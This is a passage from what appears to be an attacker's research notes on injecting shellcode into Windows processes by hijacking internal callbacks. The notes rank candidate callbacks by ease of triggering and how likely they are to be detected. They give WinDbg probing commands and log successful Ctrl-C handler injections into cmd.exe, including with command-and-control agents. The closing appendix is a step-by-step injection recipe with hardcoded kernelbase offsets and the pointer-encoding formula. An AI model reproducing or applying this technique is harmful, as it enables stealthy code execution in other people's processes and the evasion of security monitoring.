   - Delay-load DLL resolution
   - COM object instantiation
5. Notification callback fires → shellcode executes
```

#### Why This Might Be Interesting

- **List injection**: We successfully manipulated the Ctrl-C handler list
- **Many triggers**: DLL loads happen frequently
- **Legitimate mechanism**: Process loading DLLs is normal behavior

#### Research Questions

- [ ] Is the callback invocation CFG protected?
- [ ] What's the notification entry structure?
- [ ] Are there lock/synchronization requirements?
- [ ] What's the callback signature?

#### WinDbg Investigation Commands

```
# Find the notification list
x ntdll!*DllNotification*
x ntdll!Ldrp*Notification*

# Check list contents
dt ntdll!_LIST_ENTRY poi(ntdll!LdrpDllNotificationList)

# Find callback invocation
uf ntdll!LdrpCalloutDllNotification
```

#### Complexity Assessment

- **Implementation**: Medium - linked list manipulation
- **Trigger**: Low - DLL loads are easy to trigger
- **Detection**: Medium - list manipulation might be monitored

---

### Candidate E: Heap Commit Routine Callbacks

#### Concept

Windows heaps can have custom commit/decommit routines for memory management:

```c
typedef struct _RTL_HEAP_PARAMETERS {
    ULONG Length;
    SIZE_T SegmentReserve;
    SIZE_T SegmentCommit;
    SIZE_T DeCommitFreeBlockThreshold;
    SIZE_T DeCommitTotalFreeThreshold;
    SIZE_T MaximumAllocationSize;
    SIZE_T VirtualMemoryThreshold;
    BOOLEAN InitialCommit;
    BOOLEAN SegmentFlags;
    UCHAR Unknown[2];
    PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;  // ← Function pointer!
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

typedef NTSTATUS (NTAPI *PRTL_HEAP_COMMIT_ROUTINE)(
    IN PVOID Base,
    IN OUT PVOID *CommitAddress,
    IN OUT PSIZE_T CommitSize
);
```

#### Attack Theory

```
1. Find target process's heap structure(s)
2. Locate CommitRoutine pointer in heap parameters
3. Overwrite with shellcode address
4. Trigger heap expansion (large allocation)
5. Commit routine called → shellcode executes
```

#### Why This Might Work

- **Deep in heap internals**: Less likely to be monitored
- **Legitimate callback**: Called during normal heap operations
- **Multiple heaps**: Process may have multiple heaps to target

#### Research Questions

- [ ] Where exactly is CommitRoutine stored at runtime?
- [ ] Is it CFG protected?
- [ ] How do we trigger heap expansion reliably?
- [ ] What heaps have custom commit routines?

#### WinDbg Investigation Commands

```
# Examine heap structures
!heap -h
dt ntdll!_HEAP
dt ntdll!_RTL_HEAP_PARAMETERS

# Find commit routine references
x ntdll!*CommitRoutine*
x ntdll!*HeapCommit*
```

#### Complexity Assessment

- **Implementation**: High - heap internals are complex
- **Trigger**: Medium - heap expansion is controllable
- **Detection**: Low - heap operations are constant

---

### Candidate F: NLS Code Page Callbacks

#### Concept

National Language Support (NLS) handles string encoding conversions. Custom code pages can have conversion callbacks.

```c
// Code page info structure has function pointers for conversion
typedef struct _CPTABLEINFO {
    USHORT CodePage;
    USHORT MaximumCharacterSize;
    USHORT DefaultChar;
    USHORT UniDefaultChar;
    USHORT TransDefaultChar;
    USHORT TransUniDefaultChar;
    USHORT DBCSCodePage;
    UCHAR LeadByte[12];
    PUSHORT MultiByteTable;
    PVOID WideCharTable;
    PUSHORT DBCSRanges;
    PUSHORT DBCSOffsets;
} CPTABLEINFO, *PCPTABLEINFO;
```

#### Attack Theory

```
1. Understand how custom code page callbacks work
2. Register or hijack a code page conversion callback
3. Trigger string conversion in target (MultiByteToWideChar, etc.)
4. Callback executes shellcode
```

#### Why This Might Be Interesting

- **Very obscure**: NLS internals are rarely examined
- **Frequent operations**: String conversion happens constantly
- **Legacy system**: Predates modern security mitigations

#### Research Questions

- [ ] Do code page callbacks exist and where?
- [ ] Are they CFG protected?
- [ ] Can we register custom code pages remotely?
- [ ] What triggers code page callback invocation?

#### WinDbg Investigation Commands

```
# Find NLS structures
x ntdll!*Nls*
x ntdll!*CodePage*
x kernelbase!*MultiByteToWideChar*

# Check code page tables
dt ntdll!_CPTABLEINFO
```

#### Complexity Assessment

- **Implementation**: High - NLS is poorly documented
- **Trigger**: Low - string operations are constant
- **Detection**: Very low - NLS is never monitored

---

## Research Priority Matrix

| Candidate | Novelty | CFG Status | Complexity | Trigger Ease | Priority |
|-----------|---------|------------|------------|--------------|----------|
| **A: TEB TxnScope** | Very High | N/A (vestigial) | N/A | N/A | ~~HIGH~~ **NOT VIABLE** |
| **C: UnhandledException** | Medium-High | ❌ **PROTECTED** | Low | Medium | ~~HIGH~~ **BLOCKED** |
| **D: DllNotification** | Medium | Unknown | Medium | Low | **HIGH - NEXT** |
| **B: ActiveFrame** | Very High | Unknown | High | Unknown | Medium |
| **E: Heap Commit** | Very High | Unknown | High | Medium | Low |
| **F: NLS Callbacks** | Very High | Unknown | Very High | Low | Low |

## CFG Protection Summary

| Technique | CFG Protected? | Status |
|-----------|---------------|--------|
| Variant 1: Ctrl-C Handlers | ❌ No | ✅ **WORKING** |
| Variant 2: WNF Callbacks | ✅ Yes | ❌ Blocked |
| Variant 3: FLS Callbacks | ✅ Yes | ❌ Blocked |
| Candidate C: Exception Filter | ✅ Yes | ❌ Blocked |
| Candidate A: TEB TxnScope | N/A | ❌ Vestigial (never called) |
| Candidate D: DLL Notifications | Unknown | 🔍 **NEXT TO INVESTIGATE** |

## Recommended Investigation Order

1. ~~TEB TxnScopeEnterCallback~~ - **NOT VIABLE** (vestigial, never invoked)
2. ~~RtlpUnhandledExceptionFilter~~ - **BLOCKED BY CFG** (confirmed)
3. **LdrpDllNotificationList** - If CFG check passes, easy trigger
4. **Others** - Based on findings from above

## Quick Reference: WinDbg Starting Commands

```
# For TEB Transaction Callbacks - INVESTIGATED, NOT VIABLE (vestigial)
dt ntdll!_TEB TxnScopeEnterCallback TxnScopeExitCallback @$teb
x ntdll!*Txn*

# For Unhandled Exception Filter - INVESTIGATED, CFG BLOCKED
x ntdll!*UnhandledException*
dq ntdll!RtlpUnhandledExceptionFilter L1

# For DLL Notifications - NEXT TO INVESTIGATE
x ntdll!*DllNotification*
x ntdll!Ldrp*Notification*
dq ntdll!LdrpDllNotificationList L1
uf ntdll!LdrpSendDllNotifications           # Find callback invocation
uf ntdll!LdrRegisterDllNotification         # How callbacks are registered

# For Heap Commit Routines
!heap -h
dt ntdll!_HEAP

# For NLS/Code Pages
x ntdll!*Nls*
x ntdll!*CodePage*
```

## Next Investigation: Candidate D (LdrpDllNotificationList)

**Key Questions:**
1. What's the structure of notification entries?
2. Is the callback invocation CFG protected?
3. How do we insert an entry into the list?
4. What triggers notifications (DLL load/unload)?

**Starting Commands:**
```
x ntdll!*DllNotification*
uf ntdll!LdrRegisterDllNotification
uf ntdll!LdrpSendDllNotifications
s -b ntdll L?500000 <pattern for list head access>
```

---

## Test Results Log

| Date | Variant | Target | Shellcode | Result |
|------|---------|--------|-----------|--------|
| 2025 | 1 | cmd.exe | calc.bin | ✅ Success (manual trigger) |
| 2025 | 1 | cmd.exe | calc.bin | ✅ Success (auto trigger) |
| 2025 | 1 | cmd.exe | Fawkes (Go) | ❌ Failed - runtime issue |
| 2025 | 1 | cmd.exe | Apollo (C#) | ❌ Failed - CLR issue |
| 2025 | 1 | cmd.exe | Xenon (C) | ✅ Success |

---

## References

- Windows Internals, 7th Edition - Console internals chapter
- ReactOS source code - Structure hints for SetConsoleCtrlHandler
- Microsoft documentation - SetConsoleCtrlHandler, GenerateConsoleCtrlEvent
- Various security research papers on callback abuse
- WinDbg documentation - Memory examination commands

---

## Appendix: Full Attack Code Flow

```
1. OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION)
2. EnumProcessModulesEx → find kernelbase.dll base
3. Calculate:
   - pHandlerList = kernelbase + 0x399490
   - pHandlerListLength = kernelbase + 0x39CBB0
   - pAllocatedLength = kernelbase + 0x39CBB4
4. ReadProcessMemory(pHandlerList) → handlerArrayAddr
5. ReadProcessMemory(pHandlerListLength) → count
6. ReadProcessMemory(pAllocatedLength) → capacity
7. Verify count < capacity
8. NtQueryInformationProcess(ProcessCookie) → cookie
9. VirtualAllocEx(PAGE_EXECUTE_READWRITE) → shellcodeAddr
10. WriteProcessMemory(shellcodeAddr, shellcode)
11. encodedAddr = ROR(shellcodeAddr XOR cookie, cookie & 0x3F)
12. targetSlot = handlerArrayAddr + (count * 8)
13. WriteProcessMemory(targetSlot, encodedAddr)
14. WriteProcessMemory(pHandlerListLength, count + 1)
15. FreeConsole()
16. AttachConsole(targetPID)
17. GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0)
18. FreeConsole()
19. AllocConsole()
20. Shellcode executes as Ctrl+C handler!
```
